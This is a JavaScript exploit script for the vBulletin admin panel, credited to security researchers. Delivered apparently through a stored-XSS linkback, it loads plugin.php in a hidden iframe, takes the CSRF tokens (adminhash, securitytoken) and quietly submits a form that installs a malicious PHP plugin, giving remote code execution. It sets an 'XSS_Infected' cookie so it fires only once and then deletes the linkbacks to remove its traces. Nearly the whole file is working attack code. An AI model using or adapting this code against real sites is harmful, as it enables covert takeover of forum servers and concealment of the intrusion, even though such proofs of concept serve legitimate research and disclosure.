// Author: MaXe / InterN0T
// Updated by: Hans-Michael Varbaek
// Sense of Security

function silent_inject() {

   // Read and save the adminhash + securitytoken - For bypassing the CSRF protection
   var adminhash = top.document.getElementById('silent_frame').contentDocument.cpform.adminhash.value;
   var securitytoken = top.document.getElementById('silent_frame').contentDocument.cpform.securitytoken.value;

   // Prepopulated form that adds a new plugin to vBulletin
   // The adminhash and securitytoken parameters are essentially CSRF tokens
   // The phpcode parameter value is updated by the python script
   var form_input = '\
   <input type="hidden" name="do" value="update" />\
   <input type="hidden" name="adminhash" value="'+adminhash+'" />\
   <input type="hidden" name="securitytoken" value="'+securitytoken+'" />\
   <input type="hidden" name="product" value="vbulletin" />\
   <input type="hidden" name="hookname" value="misc_start" />\
   <input type="hidden" name="title" value="injected_haxx" />\
   <input type="hidden" name="executionorder" value="5" />\
   <input type="hidden" name="phpcode" value=\'PHP_PAYLOAD\' />\
   <input type="hidden" name="active" value="1" />\
   <input type="hidden" name="pluginid" value="" />\
   ';

   // A function which injects our prepopulated form
   function silent_form_inject(action,method,content) {
      var silent_main_tag = document.createElement('form');

      // The inner contents of our form is equal to the content variable - This is the legacy way of doing it
      silent_main_tag.innerHTML = ' '+content;
      top.document.getElementById('silent_frame').contentDocument.body.appendChild(silent_main_tag);
      silent_main_tag.setAttribute('id','soslabs');
      silent_main_tag.setAttribute('name','soslabs');
      silent_main_tag.setAttribute('action',action);
      silent_main_tag.setAttribute('method',method);
      }

   // Inject our prepopulated form
   silent_form_inject('plugin.php?do=update','POST',form_input);

   // Submit our payload automatically - There's no turning back now
   if (document.cookie.indexOf("XSS_Infected") == -1) {
      top.document.getElementById('silent_frame').contentDocument.getElementById('soslabs').submit();
      SetCookie("XSS_Infected","true"); // Prevent re-infection / loops
   }

   // Give the malicious linkback two seconds to inject our payload, before self-removal
   var end = setTimeout("clean_up()",2000);

}

// Delete all LinkBacks on the current page - Including ours
// This basically removes our injected data
function clean_up() {
   js_check_all_option(document.linkbacks, -1);
   document.linkbacks.submit();
}

// A function to create a cookie so the infection happens only once
function SetCookie(cookieName,cookieContent) {
   var cookiePath = '/';
   var expDate=new Date();
   expDate.setTime(expDate.getTime()+372800000);
   var expires=expDate.toGMTString();
   document.cookie=cookieName+"="+escape(cookieContent)+";path="+escape(cookiePath)+";expires="+expires;
}


// If our cookie is not present, continue
if (document.cookie.indexOf("XSS_Infected") == -1) {

   // Append a (hidden) iframe to the HTML body for data injection
   var mainframe = document.createElement("iframe");
   mainframe.setAttribute('id', 'silent_frame');
   top.document.body.appendChild(mainframe);
   mainframe.setAttribute('onload', 'main.silent_inject()');
   mainframe.setAttribute('src', 'plugin.php?do=add');
}

